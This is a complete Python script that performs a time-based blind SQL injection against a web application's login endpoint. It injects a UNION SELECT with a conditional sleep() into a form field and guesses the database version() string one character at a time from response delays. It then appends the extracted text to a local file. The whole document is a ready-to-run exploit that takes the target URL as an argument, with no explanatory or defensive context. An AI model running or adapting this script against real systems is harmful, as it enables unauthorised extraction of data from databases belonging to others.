from requests import post
from time import time,sleep
from sys import argv


result=''
alpha='abcdefghijklmnopqrstuvwxyz'
alpha+=alpha.upper()+'1234567890,.+/-_@\'= ~'


def attack(base_url,char,pos):

        global result

        url = base_url+'/login/do_login'
        littleBoy = 'version()'
        payload = "2020'union select 1,2,3,sleep(if(ascii(substr("+littleBoy+","+str(pos)+",1))=ascii('"+char+"'),5,0))#"
        data = "ajaran="+payload+"&username=iAmOnly&password=haveAWhiteHat"
        headers = {"X-Requested-With":"XMLHttpRequest","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
        waktuMulai=time()
        p = post(url,data=data,headers=headers)
        deltaTime=time()-waktuMulai
        print("Char : "+char+" | Position : "+str(pos)+" -> "+str(deltaTime))
        #print(data)
        if(deltaTime>=5):
            result+=char
        return deltaTime

if(len(argv)<2):
	print("Usage: <url> ")
for i in range(1,200):
    sleep(5)
    for j in range(len(alpha)):
        exploit = attack(argv[1],alpha[j],i)
        if(exploit<5 and alpha[j]=='~'):
            print(result)
            file1=open('database.txt','r').read()
            open('database.txt','w').write(file1+'\n'+result)
            exit(0)
        elif(exploit<5):
            pass
        else:
            break
        



